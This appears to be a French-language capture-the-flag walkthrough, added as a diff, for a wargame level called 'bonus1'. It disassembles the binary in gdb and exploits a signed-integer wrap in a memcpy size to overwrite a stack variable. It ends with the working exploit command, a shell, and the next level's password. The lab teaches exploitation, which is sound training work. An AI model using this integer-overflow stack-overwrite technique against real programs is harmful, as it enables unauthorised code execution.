@@ -1,0 +1,76 @@
+gdb bonus1
+
+	  0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+	........
+	   0x08048499 <+117>:	call   0x8048350 <execl@plt>
+
+On comparaison entre 0x574f4c46 et 0x3c est faite avant d'executer exec
+
+Par contre on un call a atoi est execute plus haut en recuperant argv[1]
+
+   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
+   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
+
+Le retour de atoi est compare avec 0x9
+
+Il y a un call a memcpy que nous allons essayer d'overflow 
+
+   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+
+Attention, notre program multiplie notre nombre par 4
+
+   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
+
+memcpy prend en parametre :
+
+   0x08048468 <+68>:	mov    %ecx,0x8(%esp)  // Probablement notre nombre multiplie par 4
+   0x0804846c <+72>:	mov    %edx,0x4(%esp)	// Probablement argv[2]
+   0x08048470 <+76>:	mov    %eax,(%esp)	// Probablement une adresse aleatoire type dst, c'est ici qu'on va essayer d'overflow
+
+
+On va utiliser un unsigned int max que l'on va diviser par 4 puis ajouter 1
+
+4294967295 / 4 = 1073741823 + 1 = 1073741824
+
+//breakpoint memcpy
+b*main+79
+
+run -1073741824 hello
+
+
+x/x $esp+8
+
+0x00000000
+
+Le troisieme parametre de memcpy (size_t n) vaut 0
+
+On va essayer d'augmenter la valeur a 100, pour cela on va soustraire 25 a notre uint
+
+-1073741824 - 25 = -1073741799
+
+run -1073741799 hello
+x/x $esp+8
+0x00000064 = 100
+
+On verifie que apres le memcpy la valeur 0x3c(%esp) est bien modifie
+
+b *main+84
+
+run -1073741799 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+x/x $esp+0x3c
+->0x62413362
+
+Parfait, il nous reste plus que a rendre la valeur egal a 0x574f4c46
+
+On va maintenant ajuster notre valeur pour quelle soit egal a notre offset(40) + la valeur(4)
+
+44 / 4 = 11
+-1073741824 - 11 = -1073741813
+
+./bonus1 -1073741813 `python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'"`
+
+$ cd ../bonus2 && cat .pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+$
+
